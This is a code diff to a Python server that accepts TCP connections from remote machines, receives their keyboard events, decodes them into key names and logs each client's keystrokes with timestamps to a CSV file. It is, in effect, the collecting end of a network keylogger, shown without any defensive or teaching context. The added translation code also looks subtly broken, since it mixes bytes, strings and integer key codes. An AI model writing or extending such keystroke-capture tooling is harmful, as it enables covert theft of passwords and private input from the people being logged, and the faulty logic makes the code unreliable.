@@ -1,6 +1,6 @@
 #!/bin/python
 
-import evdev
+from evdev import ecodes
 from os import getenv
 from socketserver import *
 from select import select
@@ -28,22 +28,31 @@ def log_csv(ip_cli, ipt):
     finally:
         df.to_csv(filename)
 
+def translate_event(data):
+    (ev_type, ev_code, _) = tuple(data.split(',')[:-1])
+    if (ev_type == ecodes.EV_KEY):
+        return f"{ecodes.KEY[ev_code]}"
+    else:
+        return None
+
 
 class TCPHandler(BaseRequestHandler):
     def handle(self):
         client = self.request.getpeername()
         ip_cli = f'{client[0]}:{client[1]}'
-        log_csv(ip_cli, "NEW CONNEXION")
+        log_csv(ip_cli, "[NEW CONNEXION]")
         while True:
             try:
                 data = self.request.recv(1024)
             except (ConnectionResetError, BrokenPipeError):
                 print(f'[+] {ip_cli} disconnected.')
-                log_csv(ip_cli, 'KO')
+                log_csv(ip_cli, '[KO]')
                 return
 
+            data = translate_event(data)
             if not data:
                 continue
+
             cur_time = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
             print(f'[+] {cur_time}: Received new keystrokes from {ip_cli}:{data}')
             log_csv(ip_cli, f'{data}\n{cur_time}')
